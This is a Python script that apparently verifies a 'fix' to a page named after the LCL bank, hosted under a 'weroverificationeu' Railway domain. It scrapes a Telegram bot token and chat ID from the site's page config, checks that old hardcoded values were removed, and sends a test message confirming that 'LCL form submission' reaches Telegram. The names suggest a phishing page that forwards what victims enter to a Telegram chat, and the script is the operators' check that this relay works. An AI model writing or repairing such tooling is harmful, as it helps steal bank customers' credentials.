import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

print("=" * 70)
print("WERO LCL - FIX VERIFICATION TEST")
print("=" * 70)
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Extract tokens
print("[1/3] Extracting Telegram tokens from Railway...")
try:
    response = requests.get(TEST_PAGE, timeout=10)
    config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
    match = re.search(config_pattern, response.text, re.DOTALL)
    bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', match.group(1)).group(1)
    chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', match.group(1)).group(1)
    print("[OK] Tokens extracted")
except Exception as e:
    print(f"[ERROR] {e}")
    exit(1)

tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

print()
print("[2/3] Fetching LCL page from Railway...")

try:
    lcl_response = requests.get(f"{RAILWAY_URL}/lcl.html", timeout=10)
    print(f"[OK] LCL page status: {lcl_response.status_code}")
    
    # Check if hardcoded token is gone
    if "[REDACTED]" in lcl_response.text:
        print("[WARNING] Still has [REDACTED] hardcoded token!")
    elif "window.telegramConfig" in lcl_response.text:
        print("[OK] window.telegramConfig found in LCL page")
    else:
        print("[WARNING] Config script might be missing")
    
    # Check for old chat ID
    if "6078788670" in lcl_response.text:
        print("[WARNING] Old hardcoded Chat ID still present!")
    else:
        print("[OK] Old hardcoded Chat ID removed")
    
except Exception as e:
    print(f"[ERROR] {e}")
    exit(1)

print()
print("[3/3] Sending test to Telegram...")

test_message = f"""LCL FIX VERIFICATION
=====================
Status: Fixed
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Testing LCL form submission with corrected Telegram config.
- Removed hardcoded [REDACTED] token
- Using window.telegramConfig
- Improved error handling
- Testing from Railway

Expected: This message should be received on Telegram
"""

try:
    payload = {"chat_id": chat_id, "text": test_message}
    tg_response = requests.post(tg_url, json=payload, timeout=10)
    data = tg_response.json()
    
    if data.get('ok'):
        print("[SUCCESS] Test message sent to Telegram!")
        print(f"  Message ID: {data['result']['message_id']}")
        print()
        print("=" * 70)
        print("LCL FIX VERIFIED - ALL SYSTEMS OPERATIONAL")
        print("=" * 70)
    else:
        print(f"[ERROR] Telegram error: {data.get('description')}")
except Exception as e:
    print(f"[ERROR] {e}")
